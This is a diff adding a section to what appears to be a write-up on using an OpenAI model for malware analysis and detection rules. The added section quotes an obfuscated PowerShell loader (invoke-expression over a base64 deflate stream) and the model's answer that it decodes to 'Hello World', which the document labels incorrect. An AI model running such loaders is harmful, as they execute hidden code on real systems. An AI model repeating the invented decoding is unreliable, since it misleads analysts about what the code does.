@@ -367,3 +367,17 @@ detection:
       - Get
   condition: selection *
 ```
+
+<h4>9. Incorrect response</h4>
+
+`OpenAI prompt:` 
+> Extract final payload  
+```
+. ( $ShellId[1]+$sHellId[13]+‘x’)( nEw-OBjEct sySTeM.IO.ComPressIon.DEFLatEsTREAm([IO.mEmOrySTrEAM][conVerT]::fromBASe64sTRING( ‘TZFRa8IwFIXf9ysupRsJs6FuOJhlwixuE0Ytq+CD+BDbi+1s02IiWtT/vqa1nRCSSzjnnu8mRX7AnYwxTcHycl9vYgrWAr6SKEIB1uSIIYzLgksJlptnGRcReHiwZutfDBUEpVSYMQ8VC/Jwi0qyueu7aYJCEaNvs3YZvVfb7lPHlGqHPIM3MMNaxT5RBfUdoc5yXSpcrlamPmUlshl7GQyeB+f7k31xDnGSIiFmou1NI/aDPCKNvgd2D5qSfaPYqJhSsASCTU+OGXHFKx+5obfmZYEez7CdY45Hxd4DdzqdiDCPErGhV76qbFN0SKInQRGtebjVTRM8QpPwNHrowxlme2U1NriRPkFN3hofwfADMKqTFIeIMp+rWF+OwLh6qkDdfqk0GF6ZVsNhzVizjTUT+U/onpgtdolC0vWpuLu6fZ5O+5HuZUzoxWl/xU1ziYTe/QE=’ ), [io.COMPressiOn.CoMPRessIonmODE]::DEcOMpREsS) fOReaCh-ObjEcT {nEw-OBjEct Io.streAmREADEr($_,[System.TexT.encodinG]::AsCIi)} fOreach-ObJecT{ $_.reADTOeNd() } )  
+```
+
+`OpenAI Response:`
+> The final payload is:  
+```
+Hello World! This is a test of the compression and decompression of a string
+```
